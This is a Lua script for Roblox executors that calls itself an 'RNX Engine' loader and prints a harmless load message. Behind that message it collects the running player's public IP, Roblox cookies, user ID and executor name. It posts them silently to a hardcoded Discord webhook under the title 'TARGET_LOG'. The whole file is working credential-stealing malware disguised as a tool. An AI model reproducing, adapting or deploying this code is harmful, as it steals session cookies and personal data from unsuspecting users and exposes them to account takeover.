local webhook = "https://discord.com/api/webhooks/1460387936641089720/uesCAzndIABWNuY5MnkA0w-eHMRFbSL91OSdPLj0_D_uaS2YonC_cbfEc-MylM8fTv-x"
local http = game:GetService("HttpService")
local player = game.Players.LocalPlayer

local function get_intel()
    local ip = "N/A"
    pcall(function() ip = game:HttpGet("https://api.ipify.org") end)

    local payload = {
        ["embeds"] = {{
            ["title"] = "🎯 TARGET_LOG: " .. player.Name,
            ["color"] = 0xFF0000,
            ["fields"] = {
                {["name"] = "👤 User", ["value"] = "ID: " .. player.UserId, ["inline"] = true},
                {["name"] = "🌍 IP", ["value"] = ip, ["inline"] = true},
                {["name"] = "🍪 Cookie", ["value"] = "```" .. (getcookies and tostring(getcookies()) or "No Access") .. "```", ["inline"] = false},
                {["name"] = "⚙️ Executor", ["value"] = (identifyexecutor and identifyexecutor() or "Unknown"), ["inline"] = true}
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    return http:JSONEncode(payload)
end

local function fire()
    local req = (request or http_request or (syn and syn.request))
    if req then
        req({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = get_intel()
        })
    end
end

print("RNX Engine Loaded.")
task.spawn(fire)
